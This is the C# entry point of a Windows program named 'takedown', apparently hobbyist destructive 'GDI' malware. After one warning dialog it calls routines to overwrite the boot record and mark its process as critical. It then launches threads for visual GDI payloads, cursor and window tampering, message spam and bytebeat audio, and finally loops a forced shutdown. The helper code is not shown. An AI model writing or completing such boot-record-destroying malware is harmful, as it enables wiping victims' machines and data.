using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace takedown
{
    internal static class main
    {
        /// <summary>
        /// Punto de entrada principal para la aplicación.
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            if (MessageBox.Show(
                "this is your only warning\n" +
                "i aint responsible for what u do",

                "takedown - your only warning",
                MessageBoxButtons.YesNo, MessageBoxIcon.Warning, 
                MessageBoxDefaultButton.Button2
            ) == DialogResult.No)
            {
                Environment.Exit(0);
            }

            Thread moveCursor = new Thread(extra.MoveCursor);
            Thread messageSpam = new Thread(extra.StartMessageSpam);
            Thread moveWindows = new Thread(extra.MoveForegroundWindow);
            Thread changeTexts = new Thread(extra.SetForegroundWindowText);
            Thread payload1 = new Thread(payloads.GDIPayload1);
            Thread payload2 = new Thread(payloads.GDIPayload2);
            Thread payload3 = new Thread(payloads.GDIPayload3);
            Thread audioSequenceThread = new Thread(bytebeats.AudioSequenceThread);
            Thread prePayload1 = new Thread(payloads.PreGDIPayload1);
            Thread prePayload2 = new Thread(payloads.PreGDIPayload2);
            Thread prePayload3 = new Thread(payloads.PreGDIPayload3);

            destruction.OverwriteBootRecord();
            destruction.SetProcessCritical();

            payload1.Start();
            payload2.Start();
            payload3.Start();
            moveCursor.Start();
            messageSpam.Start();
            moveWindows.Start();
            changeTexts.Start();
            audioSequenceThread.Start();
            prePayload1.Start();
            prePayload2.Start();
            prePayload3.Start();

            Thread.Sleep(10000);

            while (true)
            {
                destruction.ForceShutdownComputer();
            }
        }
    }
}